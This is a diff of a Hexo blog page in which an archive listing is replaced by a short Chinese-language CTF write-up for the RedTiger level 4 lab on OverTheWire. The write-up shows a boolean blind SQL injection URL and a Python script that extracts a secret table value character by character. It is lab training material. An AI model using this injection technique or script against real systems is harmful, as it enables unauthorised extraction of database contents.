@@ -7,7 +7,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
   
-  <title>archive_a: 2020   | Hexo</title>
+  <title>redtiger_forth   | Hexo</title>
 
   
     <link rel="apple-touch-icon" href="/images/favicon.png">
@@ -85,171 +85,92 @@
 
 
       <div class="flex-container">
-        <!-- 归档页，展示本站所有文章，按照年份降序归类，url形式：https://yoursite/archives/ -->
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
 
-<!-- last: 按年份把文章分组，当前遍历到的年份 -->
-<!-- now: 当前遍历到的文章的发布年份 -->
 
-<div class="container archives">
-  <div class="post-list">
-    
-    
-      
-        <!-- 第一篇文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2021</span>
-          </h2>
-        </div>
-      
-      <div class="post-item" title="redtiger_forth">
-        <div class="time-m-d">01-17</div>
-        <div class="title">
-          <a href="/2021/01/17/redtiger-forth/">
-            <span>redtiger_forth</span>
-          </a>
-        </div>
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">redtiger_forth</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-01-17
+        </span>
+        
       </div>
-    
-      
-      <div class="post-item" title="redtiger_third">
-        <div class="time-m-d">01-16</div>
-        <div class="title">
-          <a href="/2021/01/16/redtiger-third/">
-            <span>redtiger_third</span>
-          </a>
-        </div>
+      <div class="markdown-body">
+        <h1 id="redtiger-forth"><a href="#redtiger-forth" class="headerlink" title="redtiger_forth"></a>redtiger_forth</h1><p>Target: Get the value of the first entry in table level4_secret in column keyword<br>Disabled: like<br>看题目是布尔注入<br>随便输入一些东西，指挥返回0和1</p>
+<p>这就去学习了一下布尔类型的sql注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;redtiger.labs.overthewire.org&#x2F;level4.php?id&#x3D;1 and 1&#x3D;(select length(keyword)&#x3D;21 from level4_secret)</span><br></pre></td></tr></table></figure>
+
+<p>构造出来一个url</p>
+<p>然后看了一下大佬的wp<br>写一个简单的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">keword=<span class="string">&#x27;&#x27;</span></span><br><span class="line">char=string.printable</span><br><span class="line">url=<span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php?id=1 and 1=(select ascii(substr((select keyword from level4_secret),&#123;0&#125;,1))=&#123;1&#125;)&#x27;</span></span><br><span class="line">cookie=&#123;<span class="string">&#x27;level4login&#x27;</span>:<span class="string">&#x27;there_is_no_bug&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">22</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> char:</span><br><span class="line">        test=url.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(c))</span><br><span class="line">        r=requests.get(test,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;Query returned 1 rows.&#x27;</span>,r.text):</span><br><span class="line">            <span class="built_in">print</span> i,c</span><br><span class="line">            keword+=c</span><br><span class="line"><span class="built_in">print</span> keword</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>得到flag！</p>
+</blockquote>
+
       </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/01/16/redtiger-third/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-01-17
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
     
-      
-      <div class="post-item" title="XCTF-4th-CyberEarth">
-        <div class="time-m-d">01-14</div>
-        <div class="title">
-          <a href="/2021/01/14/XCTF-4th-CyberEarth/">
-            <span>XCTF-4th-CyberEarth</span>
-          </a>
-        </div>
-      </div>
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#redtiger-forth"><span class="toc-text">redtiger_forth</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
     
-      
-      <div class="post-item" title="XCTF-4th-WHCTF-2017">
-        <div class="time-m-d">01-09</div>
-        <div class="title">
-          <a href="/2021/01/09/XCTF-4th-WHCTF-2017/">
-            <span>XCTF-4th-WHCTF-2017</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="网鼎杯2018">
-        <div class="time-m-d">01-08</div>
-        <div class="title">
-          <a href="/2021/01/08/%E7%BD%91%E9%BC%8E%E6%9D%AF2018/">
-            <span>网鼎杯2018</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="csaw-ctf-2016-quals">
-        <div class="time-m-d">01-07</div>
-        <div class="title">
-          <a href="/2021/01/07/csaw-ctf-2016-quals/">
-            <span>csaw-ctf-2016-quals</span>
-          </a>
-        </div>
-      </div>
-    
-      
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2020</span>
-          </h2>
-        </div>
-      
-      <div class="post-item" title="TokyoWesterns">
-        <div class="time-m-d">12-27</div>
-        <div class="title">
-          <a href="/2020/12/27/TokyoWesterns/">
-            <span>TokyoWesterns</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="护网杯2018">
-        <div class="time-m-d">12-26</div>
-        <div class="title">
-          <a href="/2020/12/26/%E6%8A%A4%E7%BD%91%E6%9D%AF2018/">
-            <span>护网杯2018</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="xtctf">
-        <div class="time-m-d">12-24</div>
-        <div class="title">
-          <a href="/2020/12/24/xtctf/">
-            <span>xtctf</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="XCTF 4th-CyberEarth">
-        <div class="time-m-d">12-19</div>
-        <div class="title">
-          <a href="/2020/12/19/XCTF%204th-CyberEarth/">
-            <span>XCTF 4th-CyberEarth</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="强网杯 2019 web题">
-        <div class="time-m-d">12-18</div>
-        <div class="title">
-          <a href="/2020/12/18/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20web%E9%A2%98/">
-            <span>强网杯 2019 web题</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="攻防世界web高手区003">
-        <div class="time-m-d">12-17</div>
-        <div class="title">
-          <a href="/2020/12/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E5%8C%BA003/">
-            <span>攻防世界web高手区003</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="The first try">
-        <div class="time-m-d">12-17</div>
-        <div class="title">
-          <a href="/2020/12/17/The%20first%20try/">
-            <span>The first try</span>
-          </a>
-        </div>
-      </div>
-    
-      
-      <div class="post-item" title="Hello World">
-        <div class="time-m-d">12-16</div>
-        <div class="title">
-          <a href="/2020/12/16/hello-world/">
-            <span>Hello World</span>
-          </a>
-        </div>
+      <div class="comments-container">
+        
+
+
+
+
+
       </div>
     
   </div>
-</div>
+
 
         <div class="footer">
   <div class="social">
